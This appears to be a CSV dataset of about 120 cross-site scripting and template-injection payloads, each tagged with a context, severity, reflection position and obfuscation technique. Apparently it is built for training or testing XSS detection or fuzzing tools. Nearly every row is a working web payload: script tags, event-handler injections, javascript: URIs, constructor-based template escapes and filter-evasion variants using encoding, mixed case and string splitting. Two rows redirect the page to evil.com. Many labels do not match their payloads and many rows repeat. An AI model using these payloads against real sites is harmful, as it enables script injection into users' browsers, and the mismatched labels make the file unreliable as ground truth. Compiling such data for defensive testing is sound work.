payload,payload_with_context,context,severity,source,sink,reflection_position,technique
javascript:confirm(1),javascript:confirm(1) [position:html_body],js_uri,low,,,html_body,mutated
javascript:alert(	document.domain),javascript:alert(	document.domain) [position:html_body],js_uri,high,,,html_body,obfuscated:tab_newline_inject
{{7*7}},{{7*7}} [position:attribute],template_injection,medium,,,attribute,mutated
"\"" onerror
=alert(	1)//","\"" onerror
=alert(	1)// [position:attribute]",attribute,low,,,attribute,obfuscated:tab_newline_inject
"<embed src=""javascript:al'+'ert(1)"">","<embed src=""javascript:al'+'ert(1)""> [position:html_body]",tag_injection,high,,,html_body,obfuscated:concat_split
${alert(1)},${alert(1)} [position:script],template_injection,low,,,script,mutated
"<textarea>d.innerHTML+='';</script>//[""'`-->]]>]</div>","<textarea>d.innerHTML+='';</script>//[""'`-->]]>]</div> [position:attribute]",attribute,high,,,attribute,mutated
\x3cmarquee onstart=alert(1)\x3e,\x3cmarquee onstart=alert(1)\x3e [position:none],event_handler,medium,,,none,obfuscated:hex_escape
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",event_handler,medium,,,script,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:none],event_handler,low,,,none,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,high,,,attribute,obfuscated:comment_inject
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:html_body]",template_injection,medium,,,html_body,obfuscated:url_encode
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,low,,,script,original
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:attribute],event_handler,low,,,attribute,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,medium,,,attribute,original
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,medium,,,attribute,original
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:none]",template_injection,low,,,none,original
onerror='alert(1)',onerror='alert(1)' [position:html_body],html_body,medium,,,html_body,none
javascript:alert(1),javascript:alert(1) [position:html_body],tag_injection,low,,,html_body,original
"<%00vIdeO><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">","<%00vIdeO><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])""> [position:html_body]",html_body,high,,,html_body,mutated
<%= alert(1) %>,<%= alert(1) %> [position:attribute],template_injection,medium,,,attribute,original
"dOcUmEnT.WrItE(""<ImG SrC=X OnErRoR=AlErT(1)>"")","dOcUmEnT.WrItE(""<ImG SrC=X OnErRoR=AlErT(1)>"") [position:script]",dom_sink,medium,,,script,obfuscated:mixed_case
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:html_body],tag_injection,medium,,,html_body,mutated
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,medium,,,attribute,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:style]",js_uri,medium,,,style,mutated
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,original
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:html_body],event_handler,high,,,html_body,original
"onload=""alert(1)""","onload=""alert(1)"" [position:html_body]",html_body,medium,,,html_body,none
<ScRiPt>pRoMpT(1)</ScRiPt>,<ScRiPt>pRoMpT(1)</ScRiPt> [position:script],script_injection,medium,,,script,obfuscated:mixed_case
"onload=""self.alert(1)""","onload=""self.alert(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:none]",dom_sink,medium,,,none,mutated
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:script]",tag_injection,high,,,script,original
<img/src=x onerror=confirm(1)//>,<img/src=x onerror=confirm(1)//> [position:attribute],event_handler,medium,,,attribute,mutated
"onerror=""window.alert(1)""","onerror=""window.alert(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
<svg onload=alert(1)>,<svg onload=alert(1)> [position:attribute],js_uri,low,,,attribute,mutated
\' OnErRoR=AlErT(1)//,\' OnErRoR=AlErT(1)// [position:script],attribute_escape,high,,,script,obfuscated:mixed_case
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,medium,,,attribute,original
<script>alert(	document.domain)</script>,<script>alert(	document.domain)</script> [position:script],script_injection,medium,,,script,obfuscated:tab_newline_inject
"<script
>d.innerHTML+='';</script>//[""'`-->]]>]</div>","<script
>d.innerHTML+='';</script>//[""'`-->]]>]</div> [position:html_body]",attribute,high,,,html_body,mutated
<script>alert(1)</script>,<script>alert(1)</script> [position:script],script_injection,medium,,,script,original
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""","\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)"" [position:script]",dom_sink,high,,,script,obfuscated:unicode_escape
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:html_body]",attribute_escape,low,,,html_body,original
"OnerrOr=""AlErt(1)""","OnerrOr=""AlErt(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
<img src=x onload=alert(1)>,<img src=x onload=alert(1)> [position:script],tag_injection,high,,,script,mutated
' %3E%3Cimg src=x onerror=alert(1)%3E,' %3E%3Cimg src=x onerror=alert(1)%3E [position:html_body],tag_injection,medium,,,html_body,obfuscated:url_encode
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;","<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>; [position:html_body]",html_body,high,,,html_body,encoding
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,high,,,script,mutated
\x3csvg onload=alert(1)\x3e,\x3csvg onload=alert(1)\x3e [position:attribute],attribute_escape,high,,,attribute,obfuscated:hex_escape
OnLOAD='aLERt(1)',OnLOAD='aLERt(1)' [position:html_body],html_body,medium,,,html_body,mutated
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:attribute]",attribute_escape,medium,,,attribute,original
"""><img src=x onerror=al'+'ert(1)>","""><img src=x onerror=al'+'ert(1)> [position:script]",dom_sink,high,,,script,obfuscated:concat_split
<%= aLeRt(1) %>,<%= aLeRt(1) %> [position:html_body],template_injection,medium,,,html_body,obfuscated:mixed_case
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:script],event_handler,high,,,script,original
"%3Ciframe src=""javascript:alert(1)""%3E","%3Ciframe src=""javascript:alert(1)""%3E [position:html_body]",tag_injection,medium,,,html_body,obfuscated:url_encode
<svg onload=alert(1)>,<svg onload=alert(1)> [position:html_body],event_handler,high,,,html_body,original
javascript:print()//,javascript:print()// [position:attribute],url,medium,,,attribute,mutated
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,medium,,,attribute,original
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:style]",attribute_escape,medium,,,style,original
<script>alert(1)</script>,<script>alert(1)</script> [position:html_body],script_injection,high,,,html_body,original
<svg onload=alert()>,<svg onload=alert()> [position:comment],attribute,medium,,,comment,none
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:attribute],attribute_escape,high,,,attribute,original
"{{cOnStRuCtOr.cOnStRuCtOr(""AlErT(1)"")()}}","{{cOnStRuCtOr.cOnStRuCtOr(""AlErT(1)"")()}} [position:style]",template_injection,medium,,,style,obfuscated:mixed_case
\x3cscript\x3ealert(1)\x3c/script\x3e,\x3cscript\x3ealert(1)\x3c/script\x3e [position:script],script_injection,medium,,,script,obfuscated:hex_escape
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:attribute],event_handler,medium,,,attribute,original
#{alert(1)},#{alert(1)} [position:script],template_injection,high,,,script,original
{{7*7}},{{7*7}} [position:script],template_injection,medium,,,script,obfuscated:tab_newline_inject
"eval(""alert(1)"")","eval(""alert(1)"") [position:attribute]",attribute,high,,,attribute,original
"<ObJeCt dAtA=""jAvAsCrIpT:AlErT(1)"">","<ObJeCt dAtA=""jAvAsCrIpT:AlErT(1)""> [position:html_body]",tag_injection,medium,,,html_body,obfuscated:mixed_case
"oNerROR=""aLerT(1)""","oNerROR=""aLerT(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
"document.write(""<svg src=x onerror=alert(1)>"")","document.write(""<svg src=x onerror=alert(1)>"") [position:script]",tag_injection,low,,,script,mutated
<SCrIpt>D.INNERHTml+='';</SCripT>,<SCrIpt>D.INNERHTml+='';</SCripT> [position:html_body],html_body,high,,,html_body,mutated
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,original
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],tag_injection,medium,,,script,mutated
"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">","<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)""> [position:none]",attribute_escape,low,,,none,obfuscated:unicode_escape
<svg onload=alert(1)>,<svg onload=alert(1)> [position:style],event_handler,medium,,,style,mutated
&quot; onerror=confirm(1) x=&quot;,&quot; onerror=confirm(1) x=&quot; [position:html_body],attribute_escape,medium,,,html_body,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,low,,,attribute,mutated
"eval(""al'+'ert(1)"")","eval(""al'+'ert(1)"") [position:script]",dom_sink,medium,,,script,obfuscated:concat_split
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,medium,,,script,original
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],script_injection,high,,,script,original
\' onerror=confirm(1)//,\' onerror=confirm(1)// [position:script],attribute_escape,low,,,script,mutated
onload='alert(1)',onload='alert(1)' [position:html_body],html_body,medium,,,html_body,none
""" onerror
=alert(	1) x
=""",""" onerror
=alert(	1) x
="" [position:attribute]",attribute,medium,,,attribute,obfuscated:tab_newline_inject
"<object data=""javaSCRIPT:alert(1)"">","<object data=""javaSCRIPT:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,mutated
<marquee onstart=al'+'ert(1)>,<marquee onstart=al'+'ert(1)> [position:none],event_handler,medium,,,none,obfuscated:concat_split
javascript:alert(1),javascript:alert(1) [position:html_body],js_uri,high,,,html_body,mutated
<svg onload=alert(1)>,<svg onload=alert(1)> [position:attribute],event_handler,high,,,attribute,mutated
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:script]",attribute_escape,low,,,script,original
<script>prompt(1)</script>,<script>prompt(1)</script> [position:html_body],script_injection,medium,,,html_body,original
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:none],dom_sink,low,,,none,original
"""><svg src=x onerror=alert(1)>","""><svg src=x onerror=alert(1)> [position:attribute]",attribute,low,,,attribute,mutated
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:attribute]",js_uri,high,,,attribute,original
<svg onload=alert(1)>,<svg onload=alert(1)> [position:none],js_uri,high,,,none,original
<img src=x onerror=al'+'ert(1)>,<img src=x onerror=al'+'ert(1)> [position:html_body],event_handler,medium,,,html_body,obfuscated:concat_split
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:html_body]",js_uri,medium,,,html_body,original
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:style]",js_uri,medium,,,style,original
"<iframe src=""javascr/**/ipt:alert(1)"">","<iframe src=""javascr/**/ipt:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,obfuscated:comment_inject
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,original
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:none]",dom_sink,low,,,none,obfuscated:url_encode
{{7*7}},{{7*7}} [position:html_body],template_injection,low,,,html_body,obfuscated:tab_newline_inject
<%= alert(1) %>,<%= alert(1) %> [position:script],template_injection,high,,,script,original
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,mutated
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,medium,,,attribute,original
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:none]",dom_sink,medium,,,none,obfuscated:comment_inject
<%= alert(1) %>,<%= alert(1) %> [position:attribute],js_uri,medium,,,attribute,original
javascript:alert(	document.domain),javascript:alert(	document.domain) [position:none],dom_sink,high,,,none,obfuscated:tab_newline_inject
javascript:alert(document.domain),javascript:alert(document.domain) [position:html_body],script_injection,medium,,,html_body,original
<iframe/onload=alert(0);>,<iframe/onload=alert(0);> [position:dom],html_body,medium,,,dom,none
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,mutated
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:html_body],script_injection,medium,,,html_body,original
<svg onload=alert()>,<svg onload=alert()> [position:attribute],html_body,medium,,,attribute,none
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:attribute]",attribute_escape,medium,,,attribute,obfuscated:comment_inject
"<object data=""javascr/**/ipt:alert(1)"">","<object data=""javascr/**/ipt:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,obfuscated:comment_inject
"\""><img src=x onerror=confirm(1)>","\""><img src=x onerror=confirm(1)> [position:script]",attribute_escape,medium,,,script,mutated
""" onfocus
=alert(	1) autofocus
=""",""" onfocus
=alert(	1) autofocus
="" [position:script]",event_handler,low,,,script,obfuscated:tab_newline_inject
javascript:confirm(1),javascript:confirm(1) [position:html_body],js_uri,high,,,html_body,obfuscated:concat_split
javascript:alert(	1),javascript:alert(	1) [position:script],tag_injection,medium,,,script,obfuscated:tab_newline_inject
javascript:alert(document.domain),javascript:alert(document.domain) [position:attribute],js_uri,low,,,attribute,original
